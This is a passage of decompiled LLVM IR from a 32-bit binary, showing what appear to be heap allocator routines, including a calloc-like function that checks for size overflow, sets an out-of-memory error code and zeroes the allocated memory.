  store i32 %v2_80531a6, i32* @edx, align 4
  store i32 %v1_80531a6, i32* @global_var_8056bcc.208, align 4
  %v1_80531ae = load i32, i32* @esi, align 4
  %v2_80531ae = add i32 %v1_80531ae, %v2_80531a6
  %v1_80531b1 = or i32 %v2_80531ae, 1
  store i32 %v1_80531b1, i32* %eax.global-to-local, align 4
  %v2_80531b4 = add i32 %v1_80531a6, 4
  %v3_80531b4 = inttoptr i32 %v2_80531b4 to i32*
  store i32 %v1_80531b1, i32* %v3_80531b4, align 4
  %v0_80531b7 = load i32, i32* @global_var_8056f08.220, align 8
  %v1_80531b7 = load i32, i32* @esi, align 4
  %v2_80531b7 = add i32 %v1_80531b7, %v0_80531b7
  store i32 %v2_80531b7, i32* @global_var_8056f08.220, align 8
  br i1 %v2_805301e, label %dec_label_pc_805320f, label %dec_label_pc_80531c1

dec_label_pc_80531c1:                             ; preds = %dec_label_pc_80531a6
  %v1_80531c1 = add i32 %v1_805301e, -12
  store i32 %v0_805300b, i32* %ecx.global-to-local, align 4
  %v1_80531c8 = and i32 %v1_80531c1, -8
  store i32 %v1_80531c8, i32* %eax.global-to-local, align 4
  %v1_80531cd = or i32 %v1_80531c8, 1
  store i32 %v1_80531cd, i32* @edx, align 4
  %v5_80531d0 = icmp ult i32 %v1_80531c8, 15
  store i32 %v1_80531cd, i32* %v2_8053014, align 4
  %v0_80531d6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531d6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80531d6 = add i32 %v0_80531d6, 4
  %v3_80531d6 = add i32 %v2_80531d6, %v1_80531d6
  %v4_80531d6 = inttoptr i32 %v3_80531d6 to i32*
  store i32 5, i32* %v4_80531d6, align 4
  %v0_80531de = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531de = load i32, i32* %eax.global-to-local, align 4
  %v2_80531de = add i32 %v0_80531de, 8
  %v3_80531de = add i32 %v2_80531de, %v1_80531de
  %v4_80531de = inttoptr i32 %v3_80531de to i32*
  store i32 5, i32* %v4_80531de, align 4
  br i1 %v5_80531d0, label %dec_label_pc_805320f, label %dec_label_pc_80531e8

dec_label_pc_80531e8:                             ; preds = %dec_label_pc_80531c1
  %v0_80531eb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531ed = add i32 %v0_80531eb, 8
  store i32 %v1_80531ed, i32* %eax.global-to-local, align 4
  %v0_80531f0 = load i32, i32* @global_var_8056ee4.224, align 4
  store i32 %v0_80531f0, i32* @ebx, align 4
  store i32 %v1_80531ed, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056ee4.224, align 4
  %v1_8053201 = call i32 @function_8053939(i32 %v1_80531ed)
  store i32 %v1_8053201, i32* %eax.global-to-local, align 4
  %v0_8053206 = load i32, i32* @ebx, align 4
  store i32 %v0_8053206, i32* @global_var_8056ee4.224, align 4
  br label %dec_label_pc_805320f

dec_label_pc_805320f:                             ; preds = %dec_label_pc_80531c1, %dec_label_pc_80531a6, %dec_label_pc_80531a1, %dec_label_pc_80530d0, %dec_label_pc_80531e8
  %v0_805320f = load i32, i32* @global_var_8056f08.220, align 8
  store i32 %v0_805320f, i32* %eax.global-to-local, align 4
  %v1_8053214 = load i32, i32* @global_var_8056f0c.225, align 4
  %tmp133 = icmp ugt i32 %v0_805320f, %v1_8053214
  br i1 %tmp133, label %dec_label_pc_805321c, label %dec_label_pc_8053221

dec_label_pc_805321c:                             ; preds = %dec_label_pc_805320f
  store i32 %v0_805320f, i32* @global_var_8056f0c.225, align 4
  br label %dec_label_pc_8053221

dec_label_pc_8053221:                             ; preds = %dec_label_pc_805320f, %dec_label_pc_805321c
  %v1_8053221 = load i32, i32* @global_var_8056f04.218, align 4
  %v2_8053221 = add i32 %v1_8053221, %v0_805320f
  store i32 %v2_8053221, i32* %eax.global-to-local, align 4
  %v1_8053227 = load i32, i32* @global_var_8056f14.221, align 4
  %tmp134 = icmp ugt i32 %v2_8053221, %v1_8053227
  br i1 %tmp134, label %dec_label_pc_805322f, label %dec_label_pc_8053234

dec_label_pc_805322f:                             ; preds = %dec_label_pc_8053221
  store i32 %v2_8053221, i32* @global_var_8056f14.221, align 4
  br label %dec_label_pc_8053234

dec_label_pc_8053234:                             ; preds = %dec_label_pc_8053221, %dec_label_pc_805322f
  %v0_8053234 = load i32, i32* @global_var_8056bcc.208, align 4
  store i32 %v0_8053234, i32* @ebx, align 4
  %v1_805323a = add i32 %v0_8053234, 4
  %v2_805323a = inttoptr i32 %v1_805323a to i32*
  %v3_805323a = load i32, i32* %v2_805323a, align 4
  %v1_805323d = and i32 %v3_805323a, -4
  store i32 %v1_805323d, i32* %ecx.global-to-local, align 4
  %v10_8053240 = icmp ult i32 %v1_805323d, %v1_8052edd
  br i1 %v10_8053240, label %dec_label_pc_80532c0, label %dec_label_pc_8053246

dec_label_pc_8053246:                             ; preds = %dec_label_pc_8053234
  store i32 %v1_8052f68, i32* %esi.global-to-local, align 4
  %v2_805324c = sub i32 %v1_805323d, %v1_8052f68
  store i32 %v2_805324c, i32* %ecx.global-to-local, align 4
  %v2_805324e = add i32 %v0_8053234, %v1_8052f68
  store i32 %v2_805324e, i32* @edx, align 4
  %v1_8053251 = or i32 %v1_8052f68, 1
  store i32 %v1_8053251, i32* %eax.global-to-local, align 4
  store i32 %v2_805324e, i32* @global_var_8056bcc.208, align 4
  store i32 %v1_8053251, i32* %v2_805323a, align 4
  %v0_805325d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805325d

dec_label_pc_805325d:                             ; preds = %dec_label_pc_8052eee, %dec_label_pc_8053246
  %v0_805325d = phi i32 [ %v5_8052f01, %dec_label_pc_8052eee ], [ %v0_805325d.pre, %dec_label_pc_8053246 ]
  %v1_805325d = or i32 %v0_805325d, 1
  store i32 %v1_805325d, i32* %ecx.global-to-local, align 4
  %v0_8053260 = load i32, i32* @ebx, align 4
  %v1_8053260 = add i32 %v0_8053260, 8
  store i32 %v1_8053260, i32* %ebx.global-to-local, align 4
  %v1_8053263 = load i32, i32* @edx, align 4
  %v2_8053263 = add i32 %v1_8053263, 4
  %v3_8053263 = inttoptr i32 %v2_8053263 to i32*
  store i32 %v1_805325d, i32* %v3_8053263, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_8053268:                             ; preds = %dec_label_pc_8052ca8
  %v5_805326e = sub i32 %v1_8052c8b, %v1_8052f68
  store i32 %v5_805326e, i32* %eax.global-to-local, align 4
  %v2_8053272 = add i32 %v1_805327f, %v1_8052f68
  store i32 %v2_8053272, i32* @edx, align 4
  %v1_8053276 = or i32 %v1_8052f68, 1
  store i32 %v2_8053272, i32* @global_var_8056bd0.209, align 16
  store i32 %v1_8053276, i32* %v2_8052c85, align 4
  %v0_8053282 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053284 = load i32, i32* @edx, align 4
  store i32 %v0_8053284, i32* @global_var_8056bdc.226, align 4
  %v1_805328a = or i32 %v0_8053282, 1
  store i32 %v1_805328a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053284, i32* @global_var_8056be0.211, align 32
  %v1_8053293 = add i32 %v0_8053284, 8
  %v2_8053293 = inttoptr i32 %v1_8053293 to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8053293, align 4
  %v0_805329a = load i32, i32* @edx, align 4
  %v1_805329a = add i32 %v0_805329a, 12
  %v2_805329a = inttoptr i32 %v1_805329a to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_805329a, align 4
  %v0_80532a1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80532a1 = load i32, i32* @edx, align 4
  %v2_80532a1 = add i32 %v1_80532a1, 4
  %v3_80532a1 = inttoptr i32 %v2_80532a1 to i32*
  store i32 %v0_80532a1, i32* %v3_80532a1, align 4
  %v0_80532a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80532a4 = load i32, i32* @edx, align 4
  %v3_80532a4 = add i32 %v1_80532a4, %v0_80532a4
  %v4_80532a4 = inttoptr i32 %v3_80532a4 to i32*
  store i32 %v0_80532a4, i32* %v4_80532a4, align 4
  br label %dec_label_pc_80532b2

dec_label_pc_80532a9:                             ; preds = %dec_label_pc_8052cb7
  store i32 %v1_8052f68, i32* %ebx.global-to-local, align 4
  %v0_80532ad = load i32, i32* @ebp, align 4
  %v2_80532ad = or i32 %v1_8052f68, 4
  %v3_80532ad = add i32 %v0_80532ad, %v2_80532ad
  %v4_80532ad = inttoptr i32 %v3_80532ad to i32*
  %v5_80532ad = load i32, i32* %v4_80532ad, align 4
  %v6_80532ad = or i32 %v5_80532ad, 1
  store i32 %v6_80532ad, i32* %v4_80532ad, align 4
  br label %dec_label_pc_80532b2

dec_label_pc_80532b2:                             ; preds = %dec_label_pc_8053268, %dec_label_pc_80532a9
  %v0_80532b2 = load i32, i32* @ebp, align 4
  %v1_80532b2 = add i32 %v0_80532b2, 8
  store i32 %v1_80532b2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_80532b7:                             ; preds = %dec_label_pc_8052da7
  %v1_80532b7 = load i32, i32* @ebx, align 4
  %v2_80532b7 = add i32 %v0_8052db6, 4
  %v3_80532b7 = add i32 %v2_80532b7, %v1_80532b7
  %v4_80532b7 = inttoptr i32 %v3_80532b7 to i32*
  %v5_80532b7 = load i32, i32* %v4_80532b7, align 4
  %v6_80532b7 = or i32 %v5_80532b7, 1
  store i32 %v6_80532b7, i32* %v4_80532b7, align 4
  br label %dec_label_pc_80532bc

dec_label_pc_80532bc:                             ; preds = %dec_label_pc_8052dbf, %dec_label_pc_80532b7
  %v0_80532bc = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80532bc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_80532c0:                             ; preds = %dec_label_pc_805307e, %dec_label_pc_8053234, %dec_label_pc_8053088
  %v0_80532c0 = load i32, i32* %stack_var_-92, align 4
  %v1_80532c0 = call i32 @function_8052719(i32 %v0_80532c0)
  store i32 %v1_80532c0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80532c7 = inttoptr i32 %v1_80532c0 to i32*
  store i32 12, i32* %v1_80532c7, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_80532cd:                             ; preds = %dec_label_pc_80532bc, %dec_label_pc_80532b2, %dec_label_pc_805325d, %dec_label_pc_8052f19, %dec_label_pc_8052ecb, %dec_label_pc_8052c52, %dec_label_pc_80532c0
  store i32 %v2_8052b89, i32* @eax, align 4
  store i32 %v2_8052b89, i32* %stack_var_-92, align 4
  %v2_80532d6 = call i32 @function_80540a0(i32 %v2_8052b89, i32 1)
  store i32 %v2_80532d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532de

dec_label_pc_80532de:                             ; preds = %dec_label_pc_8052ba7, %dec_label_pc_80532cd
  %v0_80532e1 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80532e1, i32* %eax.global-to-local, align 4
  store i32 %v0_8052b76, i32* @esi, align 4
  store i32 %v0_8052b75, i32* @edi, align 4
  store i32 %v0_8052b74, i32* @ebp, align 4
  ret i32 %v0_80532e1

; uselistorder directives
  uselistorder i32 %v0_80532a4, { 1, 0 }
  uselistorder i32 %v0_8053284, { 1, 0, 2 }
  uselistorder i32 %v2_8053221, { 1, 0, 2 }
  uselistorder i32 %v0_805320f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80531a6, { 1, 0 }
  uselistorder i32 %v2_8053194, { 1, 0 }
  uselistorder i32 %v1_805314b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8053135, { 1, 0, 2 }
  uselistorder i32 %v2_8053129, { 1, 2, 0 }
  uselistorder i32 %v2_8053124, { 1, 0, 2 }
  uselistorder i32 %v1_8053114, { 2, 1, 0 }
  uselistorder i8 %v0_80530e2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80530c5, { 1, 0, 2 }
  uselistorder i32 %v0_805317993, { 2, 0, 1 }
  uselistorder i32 %v0_805318794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_80530bf, { 2, 1, 0 }
  uselistorder i32 %v8_8053095, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053092, { 1, 0 }
  uselistorder i32 %v0_8053071, { 1, 0 }
  uselistorder i32 %v2_8053042, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805303a, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053027, { 1, 0 }
  uselistorder i1 %v2_805301e, { 2, 1, 0 }
  uselistorder i32 %v1_805301e, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_805300b, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8052fef, { 1, 0, 2 }
  uselistorder i32 %v2_8052fdb, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052fa4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052f98, { 2, 1, 0 }
  uselistorder i32 %v8_8052f87, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052f6e, { 1, 0, 2 }
  uselistorder i32 %v0_8052f0a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052edd, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052ed3, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052ec5, { 1, 0 }
  uselistorder i32 %v1_8052e5c, { 1, 0 }
  uselistorder i32 %v3_8052e50, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052e60, { 1, 0 }
  uselistorder i32 %v2_8052e4a, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052e477, { 1, 0 }
  uselistorder i32 %v2_8052e3c, { 1, 0 }
  uselistorder i32 %v1_8052e20, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052e1c, { 2, 1, 0 }
  uselistorder i32 %v1_8052e18, { 1, 0 }
  uselistorder i32 %v1_8052e0c, { 2, 1, 0 }
  uselistorder i32 %v2_8052e02, { 1, 0 }
  uselistorder i32 %v1_8052dff, { 1, 2, 0 }
  uselistorder i32 %v4_8052d9d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052de8, { 1, 0 }
  uselistorder i32 %v0_8052db6, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052d89, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052d56, { 0, 2, 1 }
  uselistorder i32 %v2_8052d3a, { 1, 0 }
  uselistorder i32 %v1_8052d30, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052d2b.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052d1b, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052d12, { 1, 0, 2 }
  uselistorder i32 %v2_8052cee, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052cd6, { 2, 1, 0 }
  uselistorder i32 %v0_8052cc2, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052c88, { 1, 0, 2 }
  uselistorder i32 %v1_805327f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8052d569, { 1, 0, 2 }
  uselistorder i32 %v3_8052c35, { 1, 0, 2 }
  uselistorder i32 %v2_8052c27, { 2, 1, 0 }
  uselistorder i32 %v2_8052c02, { 2, 1, 0 }
  uselistorder i8 %v0_8052bd0, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052f68, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052bb9, { 0, 2, 1 }
  uselistorder i32 %v0_8052ba2, { 1, 0 }
  uselistorder i32 %v2_8052b89, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056f00.223, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_80543b8, { 1, 0 }
  uselistorder i32 134573012, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8056be0.211, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8052b4e, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80532de, { 1, 0 }
  uselistorder label %dec_label_pc_80532cd, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80532c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80532bc, { 1, 0 }
  uselistorder label %dec_label_pc_80532b2, { 1, 0 }
  uselistorder label %dec_label_pc_805325d, { 1, 0 }
  uselistorder label %dec_label_pc_8053234, { 1, 0 }
  uselistorder label %dec_label_pc_8053221, { 1, 0 }
  uselistorder label %dec_label_pc_805320f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80531a1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805319c, { 1, 0 }
  uselistorder label %dec_label_pc_8053180, { 1, 0 }
  uselistorder label %dec_label_pc_8053129, { 1, 0 }
  uselistorder label %dec_label_pc_8053112, { 1, 0 }
  uselistorder label %dec_label_pc_80530fb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805307e, { 1, 0 }
  uselistorder label %dec_label_pc_8053071, { 1, 0 }
  uselistorder label %dec_label_pc_8053032, { 1, 0 }
  uselistorder label %dec_label_pc_805300b, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052fef, { 1, 0 }
  uselistorder label %dec_label_pc_8052fd6, { 1, 0 }
  uselistorder label %dec_label_pc_8052fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8052ed3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb4, { 1, 0 }
  uselistorder label %dec_label_pc_8052e47, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052e20, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052da7, { 1, 0 }
  uselistorder label %dec_label_pc_8052d56, { 1, 0 }
  uselistorder label %dec_label_pc_8052d2e, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052d17, { 1, 0 }
  uselistorder label %dec_label_pc_8052c85, { 1, 0 }
  uselistorder label %dec_label_pc_8052d56.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c52, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052bd0, { 1, 0 }
}

define i32 @function_80532e8(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80532e8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80532e8 = load i32, i32* @edi, align 4
  %v0_80532ea = load i32, i32* @ebx, align 4
  %v12_80532eb = ptrtoint i32* %stack_var_-28 to i32
  %v4_80532ee = trunc i64 %arg1 to i32
  store i32 %v4_80532ee, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_80532f8 = sdiv i64 %sext, 4294967296
  %v3_80532f8 = sext i32 %arg2 to i64
  %v4_80532f8 = mul nsw i64 %v3_80532f8, %v2_80532f8
  %v5_80532f8 = trunc i64 %v4_80532f8 to i32
  store i32 %v5_80532f8, i32* @ebx, align 4
  %v2_80532fb = icmp eq i32 %v4_80532ee, 0
  br i1 %v2_80532fb, label %dec_label_pc_805331d, label %dec_label_pc_80532ff

dec_label_pc_80532ff:                             ; preds = %dec_label_pc_80532e8
  store i32 %v4_80532ee, i32* @edi, align 4
  %div = udiv i32 %v5_80532f8, %v4_80532ee
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_80532f8, %v4_80532ee
  store i32 %tmp14, i32* @edx, align 4
  %v12_8053307 = icmp eq i32 %div, %arg2
  br i1 %v12_8053307, label %dec_label_pc_805331d, label %dec_label_pc_805330b

dec_label_pc_805330b:                             ; preds = %dec_label_pc_80532ff
  %v1_805330b = call i32 @function_8052719(i32 %v0_80532ea)
  store i32 %v1_805330b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053312 = inttoptr i32 %v1_805330b to i32*
  store i32 12, i32* %v1_8053312, align 4
  br label %dec_label_pc_80533d3

dec_label_pc_805331d:                             ; preds = %dec_label_pc_80532ff, %dec_label_pc_80532e8
  store i32 %v12_80532eb, i32* @eax, align 4
  %v2_805332d = call i32 @function_80540a0(i32 %v12_80532eb, i32 134561949)
  store i32 %v2_805332d, i32* %eax.global-to-local, align 4
  %v1_8053339 = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056800.206 to i32))
  store i32 %v1_8053339, i32* %eax.global-to-local, align 4
  %v0_805333e = load i32, i32* @ebx, align 4
  %v1_8053341 = call i32 @function_8052b74(i32 %v0_805333e)
  store i32 %v1_8053341, i32* %eax.global-to-local, align 4
  store i32 %v1_8053341, i32* %ebx.global-to-local, align 4
  %v1_805334b = icmp eq i32 %v1_8053341, 0
  br i1 %v1_805334b, label %dec_label_pc_80533c2, label %dec_label_pc_805334f

dec_label_pc_805334f:                             ; preds = %dec_label_pc_805331d
  %v1_805334f = add i32 %v1_8053341, -4
  %v2_805334f = inttoptr i32 %v1_805334f to i32*
  %v3_805334f = load i32, i32* %v2_805334f, align 4
  store i32 %v3_805334f, i32* %eax.global-to-local, align 4
  %v2_8053352 = and i32 %v3_805334f, 2
  %v3_8053352 = icmp eq i32 %v2_8053352, 0
  %v1_8053354 = icmp eq i1 %v3_8053352, false
  br i1 %v1_8053354, label %dec_label_pc_80533c2, label %dec_label_pc_8053356

dec_label_pc_8053356:                             ; preds = %dec_label_pc_805334f
  %v1_80533563 = add i32 %v3_805334f, -4
  %v1_8053359 = and i32 %v1_80533563, -4
  store i32 %v1_8053359, i32* @edx, align 4
  %v2_805335e = udiv i32 %v1_8053359, 4
  store i32 %v2_805335e, i32* %eax.global-to-local, align 4
  %v5_8053361 = icmp ult i32 %v1_8053359, 36
  %tmp = and i32 %v1_80533563, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8053364 = or i1 %v5_8053361, %tmp18
  br i1 %v2_8053364, label %dec_label_pc_8053375, label %dec_label_pc_8053366

dec_label_pc_8053366:                             ; preds = %dec_label_pc_8053356
  %v3_805336b = inttoptr i32 %v1_8053341 to i8*
  %v4_805336b = call i32 @function_805276a(i8* %v3_805336b, i32 0, i32 %v1_8053359)
  store i32 %v4_805336b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533c2

dec_label_pc_8053375:                             ; preds = %dec_label_pc_8053356
  %v1_8053375 = inttoptr i32 %v1_8053341 to i32*
  store i32 0, i32* %v1_8053375, align 4
  %v0_805337b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805337b = add i32 %v0_805337b, 4
  %v2_805337b = inttoptr i32 %v1_805337b to i32*
  store i32 0, i32* %v2_805337b, align 4
  %v0_8053382 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053382 = add i32 %v0_8053382, 8
  %v2_8053382 = inttoptr i32 %v1_8053382 to i32*
  store i32 0, i32* %v2_8053382, align 4
  %v0_8053389 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8053389, 5
  br i1 %tmp15, label %dec_label_pc_80533c2, label %dec_label_pc_805338e

dec_label_pc_805338e:                             ; preds = %dec_label_pc_8053375
  %v0_805338e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805338e = add i32 %v0_805338e, 12
  %v2_805338e = inttoptr i32 %v1_805338e to i32*
  store i32 0, i32* %v2_805338e, align 4
  %v0_8053395 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053395 = add i32 %v0_8053395, 16
  %v2_8053395 = inttoptr i32 %v1_8053395 to i32*
  store i32 0, i32* %v2_8053395, align 4
  %v0_805339c = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_805339c, 7
  br i1 %tmp16, label %dec_label_pc_80533c2, label %dec_label_pc_80533a1

dec_label_pc_80533a1:                             ; preds = %dec_label_pc_805338e
  %v0_80533a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533a1 = add i32 %v0_80533a1, 20
  %v2_80533a1 = inttoptr i32 %v1_80533a1 to i32*
  store i32 0, i32* %v2_80533a1, align 4
  %v0_80533a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533a8 = add i32 %v0_80533a8, 24
  %v2_80533a8 = inttoptr i32 %v1_80533a8 to i32*
  store i32 0, i32* %v2_80533a8, align 4
  %v0_80533af = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_80533af, 9
  br i1 %tmp17, label %dec_label_pc_80533c2, label %dec_label_pc_80533b4

dec_label_pc_80533b4:                             ; preds = %dec_label_pc_80533a1
  %v0_80533b4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533b4 = add i32 %v0_80533b4, 28
  %v2_80533b4 = inttoptr i32 %v1_80533b4 to i32*
  store i32 0, i32* %v2_80533b4, align 4
  %v0_80533bb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533bb = add i32 %v0_80533bb, 32
  %v2_80533bb = inttoptr i32 %v1_80533bb to i32*
  store i32 0, i32* %v2_80533bb, align 4
  br label %dec_label_pc_80533c2

dec_label_pc_80533c2:                             ; preds = %dec_label_pc_80533a1, %dec_label_pc_805338e, %dec_label_pc_8053375, %dec_label_pc_805334f, %dec_label_pc_805331d, %dec_label_pc_8053366, %dec_label_pc_80533b4
  store i32 %v12_80532eb, i32* @eax, align 4
  %v2_80533cb = call i32 @function_80540a0(i32 %v12_80532eb, i32 1)
  store i32 %v2_80533cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533d3

dec_label_pc_80533d3:                             ; preds = %dec_label_pc_805330b, %dec_label_pc_80533c2
  %v0_80533d6 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80533d6, i32* %eax.global-to-local, align 4
  store i32 %v0_80532ea, i32* @ebx, align 4
  store i32 %v0_80532e8, i32* @edi, align 4
  ret i32 %v0_80533d6

; uselistorder directives
  uselistorder i32 %v1_8053359, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8053341, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_80532f8, { 1, 0, 2 }
  uselistorder i32 %v4_80532ee, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_80533d3, { 1, 0 }
  uselistorder label %dec_label_pc_80533c2, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_80533dc() local_unnamed_addr {
dec_label_pc_80533dc:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80533dc = load i32, i32* @ebp, align 4
  %v0_80533dd = load i32, i32* @edi, align 4
  %v0_80533de = load i32, i32* @esi, align 4
  %v0_80533df = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_80533e7 = icmp eq i32 %tmp6, 0
  %v1_80533ec = icmp eq i1 %v4_80533e7, false
  br i1 %v1_80533ec, label %dec_label_pc_80533fe, label %dec_label_pc_80533ee

dec_label_pc_80533ee:                             ; preds = %dec_label_pc_80533dc
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80533f2 = call i32 @function_8052b74(i32 %tmp7)
  store i32 %v1_80533f2, i32* %eax.global-to-local, align 4
